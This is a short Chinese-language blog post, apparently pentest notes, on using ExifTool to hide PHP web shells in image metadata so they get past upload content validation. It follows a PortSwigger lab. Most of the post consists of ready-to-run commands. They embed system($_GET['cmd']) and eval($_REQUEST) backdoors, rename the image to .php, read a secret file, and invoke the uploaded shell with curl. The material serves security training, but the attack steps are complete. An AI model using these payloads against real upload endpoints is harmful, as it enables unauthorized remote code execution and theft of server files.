---
# Details front-matter reference: https://hugoloveit.com/zh-cn/theme-documentation-content/#front-matter
title: 【文件上传&文件内容校验】使用 Exiftool 向图片插入数据
subtitle: ""
summary: ""

slug: 95be9cb2
date: 2023-01-31T17:47:17+08:00
lastmod: 2023-01-31T17:47:17+08:00

tags: ["文件内容校验"]
categories: [File Upload]

featuredImage: ""
featuredImagePreview: ""

draft: false
---

### Description

ExifTool 是一个强大的查看以及操作 EXIF 数据的工具。

在安全测试中, 可以用于将数据插入图片当中, 以绕过文件内容校验

[GitHub - exiftool/exiftool: ExifTool meta information reader/writer](https://github.com/exiftool/exiftool)

### Examples

**Generate File**

```plaintext
# Insert <?php echo "<pre>"; system($_GET['cmd']); ?> to polyglot.jpg
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' polyglot.jpg
mv polyglot.jpg polyglot.php

# Merger <YOUR-INPUT-IMAGE> and <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

**Usage**

Generate & Move the file

```bash
exiftool -Comment='<?php echo "<pre>"; @eval($_REQUEST['krm']); ?>' polyglot.jpg
mv polyglot.jpg polyglot.php
```

> polyglot >>  [php/01_jpg.php](https://github.com/hitoriskurimu/webshell/blob/main/php/01_jpg.php)

Upload your webshell

```bash
curl http://example.com/01_jpg.php?krm=phpinfo();
```

---

**reference**
- [Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
- [Bypass File Upload Filtering · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)